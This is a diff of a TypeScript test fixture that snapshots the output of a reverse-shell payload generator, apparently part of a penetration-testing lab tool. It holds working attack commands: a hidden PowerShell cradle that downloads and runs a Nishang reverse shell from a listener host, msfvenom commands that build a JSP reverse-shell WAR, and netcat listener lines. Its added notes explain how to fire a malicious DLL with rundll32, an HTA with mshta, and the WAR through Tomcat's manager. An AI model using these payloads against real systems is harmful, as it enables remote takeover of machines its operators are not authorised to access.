@@ -1,6 +1,7 @@
 /**
  * buildPayload output for every REVERSE_SHELLS, MSFVENOM and UPGRADE def in each of its contexts, with
- * V = { LHOST: "192.0.2.10", LPORT: "443" }, captured from 072cf01 before the listener refactor.
+ * V = { LHOST: "192.0.2.10", LPORT: "443" }, captured from 072cf01 before the listener refactor. Updated in the pre-lab
+ * content round (2026-11-09): the two per-OS WARs merged into msf-java-war; DLL, HTA, Nishang, macro and upgrade notes.
  */
 export const CATALOGUE_BEFORE: Record<string, Record<string, { text: string; prepare: string | null; notes: string[] }>> = {
   "bash-tcp": {
@@ -265,7 +266,7 @@ export const CATALOGUE_BEFORE: Record<string, Record<string, { text: string; pre
       "prepare": null,
       "notes": [
         "A working shell makes the web request hang. If it returns at once, the payload did not hold the socket.",
-        "Office macro: paste into the VBA editor. The command is split into 50-character chunks (VBA lines max ~1023) and run by AutoOpen/Document_Open.",
+        "Office macro: paste into the VBA editor. The command is split into 50-character chunks (VBA lines max ~1023), \" doubled and line breaks as vbCrLf, and run by AutoOpen/Document_Open.",
         "No penelope? rlwrap nc -lvnp 443"
       ]
     }
@@ -286,7 +287,6 @@ export const CATALOGUE_BEFORE: Record<string, Record<string, { text: string; pre
       "text": "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://192.0.2.10/rev.ps1')\"",
       "prepare": "cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 rev.ps1\necho 'Invoke-PowerShellTcp -Reverse -IPAddress 192.0.2.10 -Port 443' >> rev.ps1\npython3 -m http.server 80",
       "notes": [
-        "Inside a SQL string the single quotes are doubled, so it survives xp_cmdshell '...'.",
         "Pasted as-is at cmd.exe.",
         "LHOST and LPORT are baked into the served script: regenerate it if either changes.",
         "No penelope? rlwrap nc -lvnp 443"
@@ -296,7 +296,6 @@ export const CATALOGUE_BEFORE: Record<string, Record<string, { text: string; pre
       "text": "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://192.0.2.10/rev.ps1')\"",
       "prepare": "cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 rev.ps1\necho 'Invoke-PowerShellTcp -Reverse -IPAddress 192.0.2.10 -Port 443' >> rev.ps1\npython3 -m http.server 80",
       "notes": [
-        "Inside a SQL string the single quotes are doubled, so it survives xp_cmdshell '...'.",
         "Pasted as-is at a PowerShell prompt.",
         "LHOST and LPORT are baked into the served script: regenerate it if either changes.",
         "No penelope? rlwrap nc -lvnp 443"
@@ -371,6 +370,7 @@ export const CATALOGUE_BEFORE: Record<string, Record<string, { text: string; pre
       "notes": [
         "Catch it with penelope, or nc; no multi/handler needed for stageless shell.",
         "Check the target first (systeminfo System Type / uname -m): an x64 file will not run on x86.",
+        "To run it by hand: rundll32 C:\\path\\to\\rev.dll,x. The shell starts from DllMain when the DLL loads, so any export name works; rundll32 may then complain the entry point is missing, and the shell still runs.",
         "Pasted as-is at a real bash prompt.",
         "LHOST and LPORT are baked into the served script: regenerate it if either changes.",
         "No penelope? rlwrap nc -lvnp 443"
@@ -384,6 +384,7 @@ export const CATALOGUE_BEFORE: Record<string, Record<string, { text: string; pre
       "notes": [
         "Catch it with penelope, or nc; no multi/handler needed for stageless shell.",
         "Check the target first (systeminfo System Type / uname -m): an x64 file will not run on x86.",
+        "Run it with the 64-bit mshta: C:\\Windows\\System32\\mshta.exe <path or URL of rev.hta>. C:\\Windows\\SysWOW64\\mshta.exe is 32-bit, and a double-click may use it (check the .hta association): if the shell never arrives, check which mshta ran it.",
         "Pasted as-is at a real bash prompt.",
         "LHOST and LPORT are baked into the served script: regenerate it if either changes.",
         "No penelope? rlwrap nc -lvnp 443"
@@ -429,28 +430,13 @@ export const CATALOGUE_BEFORE: Record<string, Record<string, { text: string; pre
       ]
     }
   },
-  "msf-java-war-linux": {
+  "msf-java-war": {
     "bash-prompt": {
       "text": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.0.2.10 LPORT=443 -f war -o rev.war",
       "prepare": null,
       "notes": [
         "Catch it with penelope, or nc; no multi/handler needed for stageless shell.",
-        "Deploy through the Tomcat manager (or drop in webapps/), then browse to /rev/ to fire it.",
-        "Same payload as the Windows entry; listed per OS so the fit filter keeps it.",
-        "Pasted as-is at a real bash prompt.",
-        "LHOST and LPORT are baked into the served script: regenerate it if either changes.",
-        "No penelope? rlwrap nc -lvnp 443"
-      ]
-    }
-  },
-  "msf-java-war-windows": {
-    "bash-prompt": {
-      "text": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.0.2.10 LPORT=443 -f war -o rev.war",
-      "prepare": null,
-      "notes": [
-        "Catch it with penelope, or nc; no multi/handler needed for stageless shell.",
-        "Deploy through the Tomcat manager (or drop in webapps/), then browse to /rev/ to fire it.",
-        "Same payload as the Linux entry; listed per OS so the fit filter keeps it.",
+        "Deploy through the Tomcat manager (or drop it in webapps/), then browse to /rev/ to fire it: the app's path is the file name without .war, or the path= you deploy it with. The text deploy (/manager/text/deploy) needs a manager-script user.",
         "Pasted as-is at a real bash prompt.",
         "LHOST and LPORT are baked into the served script: regenerate it if either changes.",
         "No penelope? rlwrap nc -lvnp 443"
@@ -492,7 +478,7 @@ export const CATALOGUE_BEFORE: Record<string, Record<string, { text: string; pre
       "text": "stty raw -echo; fg",
       "prepare": null,
       "notes": [
-        "Run this in YOUR terminal, not the target's.",
+        "Run this in YOUR terminal, not the target's, right after Ctrl-Z.",
         "Pasted as-is at a real bash prompt."
       ]
     }
@@ -521,7 +507,8 @@ export const CATALOGUE_BEFORE: Record<string, Record<string, { text: string; pre
       "prepare": null,
       "notes": [
         "when the shell inherited root's HOME",
-        "Set USER first: the payload is not wrapped for bash-prompt until it is."
+        "Pasted as-is at a real bash prompt.",
+        "Set USER first."
       ]
     }
   }
